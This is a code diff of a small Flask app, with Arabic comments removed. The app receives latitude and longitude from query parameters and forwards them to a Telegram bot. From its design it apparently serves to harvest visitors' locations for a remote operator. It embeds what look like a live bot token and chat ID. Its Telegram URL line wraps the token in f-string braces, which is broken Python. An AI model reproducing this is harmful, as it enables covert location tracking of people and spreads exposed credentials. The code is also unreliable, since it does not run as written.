@@ -3,10 +3,8 @@ import requests
 
 app = Flask(__name__)
 
-# هنا تحط توكن البوت
 BOT_TOKEN = '7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ'
 
-# هنا الآيدي مال المستخدم اللي راح ترسل له الموقع (مثلاً جربه بشكل ثابت أولا)
 CHAT_ID = '6028485445'
 
 @app.route("/")
@@ -19,13 +17,12 @@ def save():
     lon = request.args.get("lon")
 
     if lat and lon:
-        # تكوين رسالة ترسلها للبوت
+       
         message = f"📍 تم استلام موقع جديد:\nLatitude: {lat}\nLongitude: {lon}"
 
-        # رابط إرسال رسالة للبوت عبر API التليجرام
         url = f"https://api.telegram.org/bot{7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ}/sendMessage"
 
-        # البيانات اللي راح ترسلها
+       
         data = {
             'chat_id': CHAT_ID,
             'text': message
